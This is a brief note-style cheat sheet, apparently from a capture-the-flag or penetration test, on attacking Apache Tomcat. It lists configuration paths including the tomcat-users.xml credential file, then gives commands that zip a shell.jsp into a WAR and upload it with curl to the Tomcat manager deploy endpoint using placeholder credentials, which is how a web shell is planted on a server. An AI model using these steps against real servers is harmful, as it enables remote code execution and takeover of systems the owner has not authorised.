Tomcat and jery

Ini zona bahaya 


/usr/local/tomcat/conf/server.xml
/usr/local/tomcat/conf/tomcat-users.xml
/usr/local/tomcat/conf/
 web.xml
 
zip -r wowogemoy.war shell.jsp
curl -u 'x:x' --upload-file wowogemoy.war "http://localhost:8084/manager/text/deploy?path=/test&update=true"
test/matamu
/opt/tomcat/webapps/
/usr/local/tomcat/webapps
